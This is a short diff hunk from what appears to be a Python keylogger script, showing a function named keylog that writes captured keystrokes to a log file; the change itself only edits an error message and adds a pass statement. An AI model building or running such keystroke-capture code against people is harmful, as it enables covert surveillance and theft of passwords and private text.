@@ -11,7 +11,8 @@ def keylog(key):
             else:
                 logs.write(key.char)
         except:
-            print("skipi 3bdsami3")
+            print("skipi abdsami3")
+            pass
 
             
 if __name__ == "__main__":
